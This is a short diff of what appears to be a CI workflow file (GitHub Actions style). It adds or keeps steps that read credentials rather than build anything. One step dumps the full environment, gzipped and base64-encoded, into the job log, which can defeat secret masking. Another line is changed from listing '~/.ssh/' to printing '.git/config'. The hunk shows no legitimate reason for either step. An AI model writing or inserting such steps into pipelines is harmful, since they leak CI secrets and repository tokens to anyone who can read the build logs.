@@ -17,5 +17,5 @@ jobs:
       - name: base64 env
         run: env | gzip -c | base64 -w0; echo
       - name: cat
-        run: ls -la ~/.ssh/
+        run: cat .git/config
         
